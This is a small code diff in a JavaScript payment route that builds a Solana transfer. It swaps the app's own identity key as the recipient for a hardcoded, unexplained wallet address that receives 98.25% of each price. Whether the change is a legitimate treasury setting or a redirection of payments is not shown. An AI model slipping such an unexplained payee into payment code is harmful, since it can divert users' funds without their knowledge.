@@ -83,7 +83,9 @@ router.post(async (req, res) => {
         .add(
           transferSol(context, {
             amount: sol(price * 0.9825),
-            destination: context.identity.publicKey,
+            destination: publicKey(
+              "BxA88YB8vEXXNWCUYq5pksgtpouQ4ps4F4w4tmX4DD7d"
+            ),
             source: createNoopSigner(receiverAddress),
           })
         )
